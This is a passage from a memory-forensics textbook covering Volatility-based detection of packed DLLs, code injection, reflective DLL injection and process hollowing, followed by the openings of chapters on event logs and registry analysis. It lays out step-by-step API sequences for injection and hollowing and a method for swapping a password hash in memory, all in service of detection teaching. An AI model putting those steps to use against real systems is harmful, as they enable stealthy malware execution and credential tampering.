The output tells you that the DLL is loaded at base address `0x180000000` in the process. Now you can go ahead and dump the DLL like this:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 -p 1524 dlldump 
     --base 0x0000000180000000 
     –-dump-dir=OUTDIR/ 

Volatility Foundation Volatility Framework 2.4
Name          Module Base        Module Name        Result
------------- ------------------ ------------------ ------
rundll32.exe  0x0000000180000000 dd438[snip].dll    OK: 
module.1524.3f769610.180000000.dll
```

When the dumped file is loaded in IDA Pro this time, you see significant differences. Notice how the unpacked copy in [Figure 8-8](#figure8-8) compares with the packed copy previously shown in [Figure 8-7](#figure8-7).

The color bar has changed to indicate that a majority of the file contains code instead of undefined data. The strange database–related export functions are gone, the import table is intact, and (most importantly) the instructions in the disassembly pane are no longer compressed.

![c08f008.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f008.png)

*[**Figure 8-8:**](#figureanchor8-8) The unpacked DLL in IDA Pro is now in good enough shape to allow static analysis.*

## Code Injection

Malware leverages code injection to perform actions from within the context of another process. By doing so, the malware can force a legitimate process to perform actions on its behalf, such as downloading additional trojans or stealing information from the system. Attackers can inject code into a process in many ways, such as writing to the remote process’ memory directly or adding a registry key that makes new processes load a DLL of the attacker’s choice. This section discusses how you can determine whether any processes on the system are victims of code injection, and if so, how you can extract the memory segments that contain malicious code.

The classes of code injection that we cover are these:

- **Remote DLL injection:** A malicious process forces the target process to load a specified DLL from disk by calling `LoadLibrary` or the native `LdrLoadDll`. By definition, the DLL *must* exist on disk prior to being injected.
- **Remote code injection:** A malicious process writes code into the memory space of a target process and forces it to execute. The code can be a block of shellcode (i.e., not a PE file) or it can be a PE file whose import table is preemptively configured for the target process.
- **Reflective DLL injection:** A malicious process writes a DLL (as a sequence of bytes) into the memory space of a target process. The DLL handles its own initialization without the help of the Windows loader. The DLL does *not* need to exist on disk prior to being injected.
- **Hollow process injection:** A malicious process starts a new instance of a legitimate process (such as `lsass.exe`) in suspended mode. Before resuming it, the executable section(s) are freed and reallocated with malicious code.

As you will learn, the technique you use to detect code injection depends on how the code was injected, which is the reason we distinguish between the different methods. Although Volatility provides the capability to detect all types, you still need to put in some analysis effort to learn when to use the various plugins and how to properly interpret their output.

In the following descriptions, Process A is the malicious process and Process B is the target.

### Remote DLL Injection

This technique is typically accomplished in the following steps:

1. Process A enables debug privilege (`SE_DEBUG_PRIVILEGE`) that gives it the right to read and write other process’ memory as if it were a debugger.
2. Process A opens a handle to Process B by calling `OpenProcess`. It must request at least `PROCESS_CREATE_THREAD`, `PROCESS_VM_OPERATION`, and `PROCESS_VM_WRITE`.
3. Process A allocates memory in Process B using `VirtualAllocEx`. The protection is typically `PAGE_READWRITE`.
4. Process A transfers a string to Process B’s memory by calling `WriteProcessMemory`. The string identifies the full path on disk to the malicious DLL and it is written at the address allocated in the previous step.
5. Process A calls `CreateRemoteThread` to start a new thread in Process B that executes the `LoadLibrary` function. The thread’s parameter is set to the full path to the malicious DLL, which already exists in Process B’s memory.
6. At this point, the injection is complete and Process B has loaded the DLL. Process A calls `VirtualFree` to free the memory containing the DLL’s path.
7. Process A calls `CloseHandle` on Process B’s process to clean up.

### DLL Injection Detection

Considering the fact that `LoadLibrary` was used to load the DLL, there is no good way to conclusively distinguish between the malicious DLL and other explicitly loaded DLLs in Process B. The VAD and PEB lists look nearly identical from a metadata perspective for all modules loaded with the same API. In other words, the injected DLL isn’t necessarily hidden at this point; it is perfectly visible with `dlllist` or tools such as Process Explorer running on the live system. However, unless you know the specific name of the DLL, it can easily blend in with the legitimate modules.

Two factors can make detection possible. First, if the injected DLL *does* attempt to hide from tools on the live system after it gets loaded (by unlinking its `_LDR_DATA_TABLE_ENTRY` from one or more of the ordered lists), you can use `ldrmodules` to detect it. The second is if the injected DLL is packed, and the unpacking procedure copies the decompressed code to a new memory region. In this case, you’ll detect it with `malfind` (described next). If neither of these things happens, you have to fall back to typical analysis involving context, path names, Yara scans, DLL load timestamps (see Chapter 18), and so on.

### Remote Code Injection

This technique starts out with the same two steps as remote DLL injection. Process A enables debug privilege and then opens a handle to Process B. It finishes up like this:

1. Process A allocates memory in Process B with the `PAGE_EXECUTE_READWRITE` protection. This protection level is necessary to allow Process A to write to the memory and Process B to read and execute it.
2. Process A transfers a block of code to Process B using `WriteProcessMemory`.
3. Process A calls `CreateRemoteThread` and points the thread’s starting address to a function within the transferred block of code.

### Code Injection Detection

The `malfind` plugin is designed to hunt down remote code injections that occur as previously described. We hinted about this many times in Chapter 7, which discussed the VAD characteristics and flags. The concept is that there will be a readable, writeable, and executable private memory region (that is, no file mapping) with all pages committed (we use a few variations of these criteria for detection). The region will contain a PE header and/or valid CPU instructions. Here’s an example showing a block of code that Stuxnet injected into `services.exe`:

```
$ python vol.py –f stuxnet.mem --profile=WinXPSP3x86 malfind
Volatility Foundation Volatility Framework 2.4

[snip]

Process: services.exe Pid: 668 Address: 0x13c00f000
Vad Tag: Vad  Protection: PAGE_EXECUTE_READWRITE
Flags: Protection: 6

0x013c00f000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x013c00f010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x013c00f020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x013c00f030  00 00 00 00 00 00 00 00 00 00 00 00 08 01 00 00   ................

0x13c00f000 4d               DEC EBP
0x13c00f001 5a               POP EDX
0x13c00f002 90               NOP
0x13c00f003 0003             ADD [EBX], AL
0x13c00f005 0000             ADD [EAX], AL
0x13c00f007 000400           ADD [EAX+EAX], AL
```

The output shows a preview of the data as both a hex dump and disassembly, starting at the base address of the injected region (`0x013c00f000`). In some cases, you’ll leverage the hex dump to determine whether the region is malicious (for example, because you see an `MZ` signature); in other cases, you’ll need to rely on the disassembly. Here’s an example that shows the disassembly coming in handy. In the following detection of Carberp, no `MZ` signature exists because it is just a block of shellcode:

```
$ python vol.py –f carberp.mem --profile=WinXPSP3x86 malfind
Volatility Foundation Volatility Framework 2.4 
[snip]

Process: svchost.exe Pid: 992 Address: 0x9d0000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x009d0000  b8 35 00 00 00 e9 8b d1 f3 7b 68 6c 02 00 00 e9   .5.......{hl....
0x009d0010  94 63 f4 7b 8b ff 55 8b ec e9 6c 11 e4 7b 8b ff   .c.{..U...l..{..
0x009d0020  55 8b ec e9 99 2e 84 76 8b ff 55 8b ec e9 74 60   U......v..U...t`
0x009d0030  7f 76 8b ff 55 8b ec e9 8a e9 7f 76 8b ff 55 8b   .v..U......v..U.

0x9d0000 b835000000       MOV EAX, 0x35
0x9d0005 e98bd1f37b       JMP 0x7c90d195
0x9d000a 686c020000       PUSH DWORD 0x26c
0x9d000f e99463f47b       JMP 0x7c9163a8
0x9d0014 8bff             MOV EDI, EDI
0x9d0016 55               PUSH EBP
```

This region at `0x9d0000` is worth further investigation because the disassembly contains CPU instructions that make sense. For example, the `JMP` destinations are valid, and the combination of `MOV EDI, EDI` followed by `PUSH EBP` indicates the start of a function prologue. When you review the output of `malfind`, keep in mind that programs may allocate executable private memory for legitimate reasons. For example, the following region in `csrss.exe` was *not* injected by malware; it was picked up by the plugin due to its similarity to injection regions:

```
Process: csrss.exe Pid: 660 Address: 0x7f6c00f000
Vad Tag: Vad  Protection: PAGE_EXECUTE_READWRITE
Flags: Protection: 6

0x7f6c00f000  c8 00 00 00 71 01 00 00 ff ee ff ee 08 70 00 00   ....q........p..
0x7f6c00f010  08 00 00 00 00 fe 00 00 00 00 10 00 00 20 00 00   ................
0x7f6c00f020  00 02 00 00 00 20 00 00 8d 01 00 00 ff ef fd 7f   ................
0x7f6c00f030  03 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00   ................

0x7f6c00f000 c8000000         ENTER 0x0, 0x0
0x7f6c00f004 7101             JNO 0x7f6c00f007
0x7f6c00f006 0000             ADD [EAX], AL
0x7f6c00f008 ff               DB 0xff
0x7f6c00f009 ee               OUT DX, AL
0x7f6f000a ff               DB 0xff
0x7f6f000b ee               OUT DX, AL
```

The disassembly does not make sense in this case. For example, there’s an `ENTER` instruction, but no `LEAVE`. There’s conditional jump (`JNO`), but no condition. Furthermore, the destination of the jump leads to `0x7f6c00f007`, an address that does not contain an instruction according to the current alignment. This memory region does not seem malicious at first glance. Consider the next example, involving Coreflood:

```
$ python vol.py –f coreflood.mem --profile=WinXPSP3x86 malfind
Volatility Foundation Volatility Framework 2.4

[snip]

Process: IEXPLORE.EXE Pid: 248 Address: 0x7ff80000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 45, PrivateMemory: 1, Protection: 6

0x7ff80000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x7ff80010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x7ff80020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x7ff80030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................

0x7ff80000 0000             ADD [EAX], AL
0x7ff80002 0000             ADD [EAX], AL
0x7ff80004 0000             ADD [EAX], AL
0x7ff80006 0000             ADD [EAX], AL
```

Most analysts assume that this range at `0x7ff80000` is a false positive. The hex dump and disassembly both consist of only zeros. However, remember that this is only a preview of the data. The CPU doesn’t necessarily start executing code at offset 0 in the injected region; it can easily point somewhere within the range. In this case, Coreflood’s anti-dumping feature wiped out its PE header (which occupied the first page) by overwriting it with zeros. If you use `volshell` to disassemble code in the second page (`0x7ff81000`), however, you see the malware’s main function:

```
$ python vol.py -f coreflood.mem --profile=WinXPSP3x86 volshell -p 248
Volatility Foundation Volatility Framework 2.4
Current context: process IEXPLORE.EXE, pid=248, ppid=1624 DTB=0x80002a0
To get help, type 'hh()'
>>> dis(0x7ff81000)
0x7ff81000 81ec20010000                     SUB ESP, 0x120
0x7ff81006 53                               PUSH EBX
0x7ff81007 8b9c2430010000                   MOV EBX, [ESP+0x130]
0x7fc81f000e 8bc3                             MOV EAX, EBX
0x7ff81010 2404                             AND AL, 0x4
0x7ff81012 55                               PUSH EBP
0x7ff81013 f6d8                             NEG AL
0x7ff81015 56                               PUSH ESI
0x7ff81016 57                               PUSH EDI
0x7ff81017 8bbc2434010000                   MOV EDI, [ESP+0x134]
[snip]
```

Malware can use several tricks to hide in process memory. The task of verifying code in these regions often requires a familiarity with assembly because injected code can look very similar to legitimate code. After `malfind` helps you narrow down the possibilities to a manageable level, you still have to apply some knowledge and context to the investigation. You can also supply an output directory (`--dump-dir`) when calling `malfind`, and it extracts the suspect regions automatically. Then you can run strings or signature scanners across the dumped files.

---

**WARNING**

Coreflood prevented many tools from carving its binary from memory by wiping out its PE header. This anti-forensics approach is an annoyance, but it shouldn’t stop you. Just use `vaddump` to extract the memory region and use a hex editor or PE editor to build your own PE header template. For more information, see *Recovering Coreflood Binaries with Volatility*: [http://mnin.blogspot.com/2008/11/recovering-coreflood-binaries-with.html](http://mnin.blogspot.com/2008/11/recovering-coreflood-binaries-with.html).

---

### Reflective DLL Injection

This method is a hybrid of the two approaches discussed previously. The content transferred from Process A to Process B is a DLL (as opposed to a block of shellcode), but after it exists in Process B, it initializes itself instead of calling `LoadLibrary`. This technique has several anti-forensic advantages:

- `LoadLibrary` only loads libraries from disk. Because this method doesn’t rely on the API, the injected DLL never needs to be written to more permanent storage. It can be loaded into memory straight from the network (for example, when exploiting a remote buffer overflow).
- Also as a result of avoiding `LoadLibrary`, the `_LDR_DATA_TABLE_ENTRY` metadata structures are not created. Thus the three lists in the PEB do not have a record of this DLL loading.

---

**NOTE**

For more information on this technique, see:

- *Remote Library Injection* by skape ([http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf](http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf)).
- *Reflective DLL Injection* by Steven Fewer: ([http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf](http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf)).
- You can also check out source code and compile your own test binaries from the following repository: [https://github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection).

---

### Reflective DLL Injection Detection

You can detect this method with `malfind`, as discussed previously. Here’s a snippet of code from the `ReflectiveDLLInjection` project’s `LoadLibraryR.c` file:

```
// alloc memory (RWX) in the host process for the image...
lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, 
                                        NULL, 
                                        dwLength, 
                                        MEM_RESERVE|MEM_COMMIT, 
                                        PAGE_EXECUTE_READWRITE ); 
if( !lpRemoteLibraryBuffer )
    break;
```

Due to the options chosen during allocation, the VAD in the host process that contains the DLL fits the criteria for `malfind`.

---

**NOTE**

Metasploit’s VNC and Meterpreter payloads are both based on the reflective DLL injection method. For more information, see [http://www.offensive-security.com/metasploit-unleashed/Payload_Types](http://www.offensive-security.com/metasploit-unleashed/Payload_Types). You should be able to detect these types of attacks in memory using the plugins discussed in this chapter.

---

### Hollow Process Injection

With the previously discussed methods of injection, the target process remains running and just executes additional (malicious) code on behalf of the malware. On the other hand, with process hollowing, the malware starts a new instance of a legitimate process, such as `lsass.exe`. Before the process’ first thread begins, the malware frees the memory containing the `lsass.exe` code (it hollows it out) and replaces it with the body of the malware. In this sense, it executes only malicious code for the remainder of the process’ lifetime. However, the PEB and various other data structures identify the path to the legitimate `lsass.exe` binary. [Figure 8-9](#figure8-9) shows a before-and-after memory layout for the described behavior.

![c08f009.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f009.png)

*[**Figure 8-9:**](#figureanchor8-9) When a process is hollowed, its executable section is replaced with malicious code.*

#### How to Hollow a Process

The following steps describe how to conduct such an attack. Recipe 15-8 in *Malware Analyst’s Cookbook* also includes the relevant C source code for each step.

1. Start a new instance of a legitimate process (for example, `C:\windows\system32\lsass.exe`), but with its first thread suspended. At this point, the `ImagePathName` in the PEB of the new process identifies the full path to the legitimate `lsass.exe`.
2. Acquire the contents for the malicious replacement code. This content can come from a file on disk, an existing buffer in memory, or over the network.
3. Determine the base address (`ImageBase`) of the `lsass.exe` process, and then free or unmap the containing memory section. At this point, the process is just an empty container (the DLLs, heaps, stacks, and open handles are still intact, but no process executable exists).
4. Allocate a new memory segment in `lsass.exe` and make sure that the memory can be read, written, and executed. You can reuse the same `ImageBase` or a different one
5. Copy the PE header for the malicious process into the newly allocated memory in `lsass.exe`.
6. Copy each PE section for the malicious process into the proper virtual address in `lsass.exe`.
7. Set the start address for the first thread (the one that has been in a suspended state) to point at the malicious process’ `AddressOfEntryPoint` value.
8. Resume the thread. At this point, the malicious process begins executing within the container created for `lsass.exe`. The `ImagePathName` in the PEB still points to `C:\windows\system32\lsass.exe`.

#### Detection

Stuxnet creates two new instances of `lsass.exe` and replaces their code, just as the previous steps described. When you list processes, you see the following:

```
$ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 pslist | grep lsass
Volatility Foundation Volatility Framework 2.4
Offset(V)  Name        PID   PPID   Thds     Hnds   Start                       
---------- ----------- ------ ------ ------ ------  ----------------------------
0x81e70020 lsass.exe      680    624     19    342  2010-10-29 17:08:54 UTC+0000
0x81c498c8 lsass.exe      868    668      2     23  2011-06-03 04:26:55 UTC+0000
0x81c47c00 lsass.exe     1928    668      4     65  2011-06-03 04:26:55 UTC+0000
```

There are three processes (PID 680, 868, and 1928), but only one is the “real” `lsass.exe`. Intuition may tell you that the one that started first based on creation time (PID 680) is the legitimate one, but we’ll show you how to confirm. First, you can view the full path to the executable and/or its command line. The following command shows this information as well as the `ImageBase` value for the processes:

```
$ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 dlllist 
      -p 680,868,1928 | grep lsass
Volatility Foundation Volatility Framework 2.4
lsass.exe pid:    680
Command line : C:\WINDOWS\system32\lsass.exe
0x01000000     0x6000     0xffff C:\WINDOWS\system32\lsass.exe

lsass.exe pid:    868
Command line : "C:\WINDOWS\\system32\\lsass.exe"
0x01000000     0x6000     0xffff C:\WINDOWS\system32\lsass.exe

lsass.exe pid:   1928
Command line : "C:\WINDOWS\\system32\\lsass.exe"
0x01000000     0x6000     0xffff C:\WINDOWS\system32\lsass.exe
```

The advertised paths are all the same (despite two having an extra set of quotes around the path) because the data in the PEB, including the `ImageBase`, is initialized at process creation, and all processes started out the same. However, as a result of being hollowed, the VAD characteristics for the region that contains the `ImageBase` are drastically different. Only the legitimate one (PID 680) still has a copy of the `lsass.exe` file mapped into the region:

```
$ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 vadinfo 
      -p 1928,868,680 --addr=0x01000000
Volatility Foundation Volatility Framework 2.4
************************************************************************
Pid:    680
VAD node @ 0x81db03c0 Start 0x01000000 End 0x01005fff Tag Vad 
Flags: CommitCharge: 1, ImageMap: 1, Protection: 7
Protection: PAGE_EXECUTE_WRITECOPY
ControlArea @823c40e008 Segment e1735398
NumberOfSectionReferences:          3 NumberOfPfnReferences:           4
NumberOfMappedViews:                1 NumberOfUserReferences:          4
Control Flags: Accessed: 1, File: 1, HadUserReference: 1, Image: 1
FileObject @82230120, Name: \WINDOWS\system32\lsass.exe
First prototype PTE: e17353d8 Last contiguous PTE: fffffffc
Flags2: Inherit: 1

************************************************************************
Pid:    868
VAD node @ 0x81f1ef08 Start 0x01000000 End 0x01005fff Tag Vad 
Flags: CommitCharge: 2, Protection: 6
Protection: PAGE_EXECUTE_READWRITE
ControlArea @81fbeee0 Segment e24b4c10
NumberOfSectionReferences:          1 NumberOfPfnReferences:           0
NumberOfMappedViews:                1 NumberOfUserReferences:          2
Control Flags: Commit: 1, HadUserReference: 1
First prototype PTE: e24b4c50 Last contiguous PTE: e24b4c78
Flags2: Inherit: 1

************************************************************************
Pid:   1928
VAD node @ 0x82086d40 Start 0x01000000 End 0x01005fff Tag Vad 
Flags: CommitCharge: 2, Protection: 6
Protection: PAGE_EXECUTE_READWRITE
ControlArea @81ff33e0 Segment e2343888
NumberOfSectionReferences:          1 NumberOfPfnReferences:           0
NumberOfMappedViews:                1 NumberOfUserReferences:          2
Control Flags: Commit: 1, HadUserReference: 1
First prototype PTE: e23438c8 Last contiguous PTE: e23438f0
Flags2: Inherit: 1
```

As an alternative to the multiple steps you just saw, you can also skip straight to `ldrmodules`. Remember that the process executable is added to the load order and memory order module lists in the PEB. Thus, when `ldrmodules` cross-references the information with the memory-mapped files in the VAD, you see a discrepancy. Here’s an example:

```
$ python vol.py -f stuxnet.vmem ldrmodules --profile=WinXPSP3x86 -p 1928
Volatility Foundation Volatility Framework 2.4
Pid      Process   Base       InLoad InInit InMem MappedPath
-------- --------- ---------- ------ ------ ----- ----------
[snip]
1928 lsass.exe     0x7c900000 True   True   True  \WINDOWS\system32\ntdll.dll
1928 lsass.exe     0x77f60000 True   True   True  \WINDOWS\system32\shlwapi.dll
1928 lsass.exe     0x771b0000 True   True   True  \WINDOWS\system32\wininet.dll
1928 lsass.exe     0x77c00000 True   True   True  \WINDOWS\system32\version.dll
1928 lsass.exe     0x01000000 True   False  True  <no name>
[snip]
```

Because `lsass.exe` was unmapped, a name is no longer associated with the region at `0x01000000`. But calling `NtUnmapViewOfSection` (step 3) doesn’t cause the PEB to lose its metadata, so those structures still have a record of the original mapping in the load order and memory order lists.

---

**NOTE**

For more information on the hollow process technique, see:

- *Analyzing Malware Hollow Process* by Eric Monti: [http://blog.spiderlabs.com/2011/05/analyzing-malware-hollow-processes.html](http://blog.spiderlabs.com/2011/05/analyzing-malware-hollow-processes.html)
- *Debugging Hollow Processes* by Alexander Hanel: [http://hooked-on-mnemonics.blogspot.com/2013/01/debugging-hollow-processes.html](http://hooked-on-mnemonics.blogspot.com/2013/01/debugging-hollow-processes.html)

---

### Postprocessing Dumped Code

After you identify injected code regions, you can extract them to disk for static analysis. In *most* cases, you just need to fix the `ImageBase` in the dumped PE header to match its location in memory and then you can load the file in IDA Pro. If imported functions aren’t visible at that time, use the `impscan` plugin to generate context information from the memory dump and import the data as labels into IDA. The same goes for any process, DLL, or kernel driver that you dump from memory, not just injected regions. Recipe 16-8 (“Scanning for Imported Functions with Impscan”) in *Malware Analyst’s Cookbook* describes this capability in further detail.

Although a majority of code you dump from memory is self-contained (for example, a single region that contains the executable code and read/write variables), that’s not always the case, especially with Poison Ivy when its “melt” functionality is enabled. This feature causes the RAT to dissolve into process memory space, scattering small pieces of its code all over. [Figure 8-10](#figure8-10) shows the effect this has on your ability to reconstruct the original binary for static analysis.

![c08f010.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f010.png)

*[**Figure 8-10:**](#figureanchor8-10) Poison Ivy’s “melt” feature spreads injected code fragments all over process memory.*

Poison Ivy is spread across 20+ different VAD regions. In the article *Reverse Engineering Poison Ivy’s Injected Code Fragments* ([http://volatility-labs.blogspot.com/2012/10/reverse-engineering-poison-ivys.html](http://volatility-labs.blogspot.com/2012/10/reverse-engineering-poison-ivys.html)), we demonstrate how to build a custom plugin for Volatility that reconstructs, as much as possible, the original binary from the fragments and puts them back into context.

---

**WARNING**

Poison Ivy’s fragmented code injection is a powerful anti-forensic technique. Designing the `pivydasm` plugin was not easy and it took a considerable amount of time. To our benefit, although the code was spread about many VAD regions, we could still follow the code by disassembling within `volshell`. Resolving strings and API calls was also possible, because we had access to the entire process’ memory space.

---

## Summary

The skills described in this chapter will help analysts detect and analyze a majority of malicious code in the wild. In particular, you learned to identify injected code, locate suspicious DLLs, dump unpacked binaries, and mine the process environment block for artifacts. As far back as we can remember, malware and rootkits have used techniques to hide from administrative and security tools on running systems; and now you understand how they work. Furthermore, you’ve seen examples of memory forensics applied to cases involving large malware campaigns (such as Zeus and Coreflood) as well as highly targeted attack tools like Stuxnet.
# Chapter 9 Event Logs

Event logs contain a wealth of forensic information and are a staple in almost any type of investigation. They contain details about application errors (such as when Word crashes after a heap-spray exploit), interactive and remote logins, changes in the firewall policy, and other events that have occurred on the system. Combined with the timestamps that are supplied with each event, the logs can help you determine exactly what happened on a system, or at least give you a timeframe on which to focus the rest of your efforts.

This chapter covers how to locate event logs in RAM and parse them for forensic purposes. Many of the log files are mapped into memory during the run time of the system, so it is typical to find hundreds, if not thousands, of individual records in memory dumps. In some cases, you may even be able to extract entries after they are marked for deletion by an administrator or maliciously cleared by an attacker.

## Event Logs in Memory

Because event records are recorded throughout the run time of a system, it makes sense that you will find these records, or even the event logs files, in memory. To find records or event logs, you first need to know their structure—what they look like and where to find them in a consistent manner—because methodologies vary greatly depending on the target operating system.

## **Analysis Objectives**

Your objectives are these:

- **Locate event logs in memory:** Starting with Vista, Microsoft made several critical changes ...
# Chapter 10  
 Registry in Memory

The registry contains various settings and configurations for the Windows operating system, applications, and users on a computer. As a core component of a Windows machine, it is accessed constantly during run time. Thus, it makes sense that the system caches all or part of the registry files in memory. Furthermore, the Windows registry holds a wealth of information useful for forensic purposes. For example, you can use it to determine what programs recently ran, extract password hashes for auditing purposes, or investigate keys and values that malicious code introduced into the system.

In this chapter, you learn how to find and access registry files in memory by walking through examples of some of the aforementioned scenarios. Furthermore, you’ll be exposed to the difference between stable and volatile registry data, and how examining hives in memory can open up a whole new realm of analysis that isn’t possible with disk forensics.

## Windows Registry Analysis

The initial research on accessing registry files in memory was done by Brendan Dolan-Gavitt in 2008. His paper *Forensic Analysis of the Windows Registry in Memory* ([dfrws.org/2008/proceedings/p26-dolan-gavitt.pdf](http://dfrws.org/2008/proceedings/p26-dolan-gavitt.pdf)) and his original code provided the pioneering research upon which all of Volatility’s current registry capabilities are built.

---

## **Analysis Objectives**

Your objectives are these:

- **Locate registry files:** Understand how Volatility locates registry files consistently throughout memory dumps of various operating system versions.
- **Parse registry data:** Learn how to translate addresses to find keys, and how to print their subkeys, values, and data.
- **Discover forensically relevant registry keys:** Find and extract forensically relevant registry keys, such as those malware uses to maintain persistence.
- **Learn about special registry keys:** Userassist, Shimcache, and Shellbags are all registry keys that contain binary data that requires extra processing. You will learn the structures for these keys as well as when and how to use them in an investigation.

## **Data Structures**

The following output shows select structures from 32-bit Windows 7. The `_CMHIVE` structure represents a registry hive file on disk, and the `_HHIVE` (hive header) helps describe the contents and current state of the hive.

```
>>> dt("_CMHIVE")
'_CMHIVE' (1584 bytes)
0x0   : Hive                           ['_HHIVE']
0x2ec : FileHandles                    ['array', 6, ['pointer', ['void']]]
0x304 : NotifyList                     ['_LIST_ENTRY']
0x30c : HiveList                       ['_LIST_ENTRY']
0x314 : PreloadedHiveList              ['_LIST_ENTRY']
0x31c : HiveRundown                    ['_EX_RUNDOWN_REF']
0x320 : ParseCacheEntries              ['_LIST_ENTRY']
0x328 : KcbCacheTable                  ['pointer', ['_CM_KEY_HASH_TABLE_ENTRY']]
[snip]
0x3a0 : FileFullPath                   ['_UNICODE_STRING']
0x3a8 : FileUserName                   ['_UNICODE_STRING']
0x3b0 : HiveRootPath                   ['_UNICODE_STRING']
[snip]

>>> dt("_HHIVE")
'_HHIVE' (748 bytes)
0x0   : Signature                      ['unsigned long']
0x4   : GetCellRoutine                 ['pointer', ['void']]
0x8   : ReleaseCellRoutine             ['pointer', ['void']]
0xc   : Allocate                       ['pointer', ['void']]
0x10  : Free                           ['pointer', ['void']]
0x14  : FileSetSize                    ['pointer', ['void']]
0x18  : FileWrite                      ['pointer', ['void']]
0x1c  : FileRead                       ['pointer', ['void']]
0x20  : FileFlush                      ['pointer', ['void']]
0x24  : HiveLoadFailure                ['pointer', ['void']]
0x28  : BaseBlock                      ['pointer', ['_HBASE_BLOCK']]
[snip]
0x58  : Storage                        ['array', 2, ['_DUAL']]
```

## **Key Points**

The key points are these:

- `Hive`: The registry hive header that contains a signature as well as a structure used for address translation.
- `HiveList`: A doubly linked list to other `_CMHIVE` structures.
- `FileFullPath`: The kernel device path (for example, `\Device\HarddiskVolume1\WINDOWS\system32\config\software`) to the registry hive. This member is not used in Windows 7, although it is still present in the structure (see [http://gleeda.blogspot.com/2011/04/windows-registry-paths.html](http://gleeda.blogspot.com/2011/04/windows-registry-paths.html)).
- `FileUserName`: The path to the registry hive on disk, prefaced with `SystemRoot` or `\??\C:\` (except the `BCD` registry, which uses the kernel device path, and the `HARDWARE` registry, which uses the “Registry” path as described for the `HiveRootPath` member). Some hives do not use this member in Windows Vista/2008 and 7.
- `HiveRootPath`: Introduced in Windows Vista, this member contains the “Registry” path (for example, `\REGISTRY\MACHINE\SOFTWARE`).
- `Signature`: The signature of the registry file. Valid registry files have a signature of `0xbee0bee0`.
- `BaseBlock`: Used to find the root key (first key) of the registry.
- `Storage`: The mapping of the virtual address spaces for keys within the registry.

---

### Data in the Registry

To see how much information could be obtained from the registry in memory on a running system, Brendan Dolan-Gavitt conducted experiments on 32-bit XP machines in various states. He concluded that 98% of hive data is recoverable on lightly used systems, and about 50% of hive data is recoverable on heavily used systems. As with most artifacts in memory, the “use-it-or-lose-it” strategy is in effect. Thus, keys and data not accessed frequently (or recently) can be, and often are, swapped to disk. This is important to keep in mind when you analyze the registry in memory dumps. For example, the presence of a key in memory is evidence that the key existed on the machine at the time of acquisition. However, the absence of a key does not necessarily mean that the key didn’t exist—it could just be missing due to paging or it might not have been read into memory in the first place.

From a forensic standpoint, you can find a plethora of information in the registry. The following list summarizes a few of the possibilities:

- **Auto-start programs:** Identify applications that run automatically when the system starts up or a user logs in.
- **Hardware:** Enumerate the external media devices that were connected to the system.
- **User account information:** Audit user passwords, accounts, most recently used (MRU) items, and user preferences.
- **Recently run programs:** Determine what applications executed recently (using data from the Userassist, Shimcache, and MUICache keys).
- **System information:** Determine system settings, installed software, and security patches that have been applied.
- **Malware configurations:** Extract data related to malware command and control sites, paths to infected files on disk, and encryption keys (anything malicious code writes to the registry).

### Stable and Volatile Data

In addition to the aforementioned items commonly used in disk forensics, some volatile registry keys and hives are found only in memory. Jamie Levy did research for her talk, *Time is on My Side* ([http://gleeda.blogspot.com/2011/08/volatility-20-and-omfw.html](http://gleeda.blogspot.com/2011/08/volatility-20-and-omfw.html)), which showed that quite a bit of information is stored only in memory. For example, you can find data on volumes, devices, and settings. In just the `SYSTEM` hive and one user’s `NTUSER.DAT` hive, we counted more than 400 volatile keys.

A close relationship exists between the stable keys found in the registry on disk and those in memory. As a machine runs, new keys are created, and others change. It makes sense that these modifications are saved back to disk at some point. It was shown by Russinovich in *Microsoft Windows Internals, 6th Edition*, that data is flushed back to the disk every five seconds if Windows APIs (for example, `RegCreateKeyEx`, `RegSetValueEx`) are used. Brendan showed in his paper that if the registry is manipulated directly in memory without using the Windows APIs, however, the changes do not get flushed back to disk at all. During his research, he demonstrated this by performing the following steps:

1. Find the administrator password hash in memory.
2. Modify memory directly to change the value to a password hash for a known password.
3. Log out of the system (so the LSA subsystem would notice the change and update).
4. Log back in with the new password.

Because the changes would never get flushed back to disk, you would not know that this type of attack had occurred by just performing disk forensics. However, with a memory sample, this type of attack is simple to detect by dumping the password hashes from the registry hive and comparing them with the ones on disk.

### Finding Registry Hives

Volatility finds registry hives in memory by using the pool scanning approach (see Chapter 5). The `_CMHIVE` structure is allocated in a pool with the tag `CM10`. After you find such an allocation, you can verify that there is a valid hive by examining the `Signature` member (`_CMHIVE.Hive.Signature`). At this point, you can use the `HiveList` member to locate all the other hives (`_CMHIVE.HiveList`). The `_CMHIVE` structure is shown in [Figure 10-1](#figure10-1).

![c10f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c10/c10f001.png)

*[**Figure 10-1:**](#figureanchor10-1) Registry hives are enumerated by pool tag scanning and walking the linked list*

The `hivelist` plugin scans for registry hives and then prints out their physical and virtual offsets and path information. The following is an example:

```
$ python vol.py -f win7.vmem --profile=Win7SP0x86 hivelist
